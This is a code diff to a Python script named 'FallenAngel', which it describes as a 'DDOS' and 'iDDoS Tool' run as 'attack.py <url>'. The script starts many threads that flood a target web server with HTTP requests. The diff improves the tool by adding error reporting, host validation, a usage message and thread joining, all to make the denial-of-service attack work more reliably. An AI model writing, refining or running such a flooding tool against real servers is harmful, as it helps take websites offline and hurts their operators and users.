@@ -17,6 +17,7 @@ import sys
 import threading
 import random
 import re
+import time
 
 # global params
 headers_useragents = list()
@@ -4854,10 +4855,9 @@ class HTTPThread(threading.Thread):
         try:
             with urllib.request.urlopen(request) as f:
                 print('success')
-                pass
         except Exception as e:
             print(f"failed: {e}")
-            pass
+            print(f"URL: {self.url}, Host: {self.host}")
 
     def run(self):
         self.httpcall()
@@ -4876,13 +4876,16 @@ def get_url_and_host():
     match = re.search(r'https?://([^/]+)/?', url)
     host = match.group(1) if match else None
 
-    print(url, host)
+    if not host:
+        raise ValueError("Invalid URL format. Could not extract host.")
+
+    print(f"URL: {url}, Host: {host}")
     return url, host
 
 def pre_starting_info():
     print('Starting the FallenAngel: \nDDOS shotings in webserver Hyper Massive Revolt iDDoS Tool')
     print('Created By Himasnhu-at')
-    print("""
+    print(r"""
         _____
        /     \
       | () () |
@@ -4890,6 +4893,10 @@ def pre_starting_info():
         ||||
         ||||
 """)
+
+def show_usage():
+    print("Usage: python attack.py <url>")
+    print("Example: python attack.py http://example.com")
 
 def main():
     if len(sys.argv) < 2 or sys.argv[1] == 'help':
@@ -4908,8 +4915,9 @@ def main():
             thread.start()
             threads.append(thread)
 
-            # Optionally, you can join threads if needed
-            # thread.join()
+        # Optionally, you can join threads if needed
+        for thread in threads:
+            thread.join()
     except KeyboardInterrupt:
         print("Interrupted by user.")
         # Optionally, join threads if you want to wait for their completion
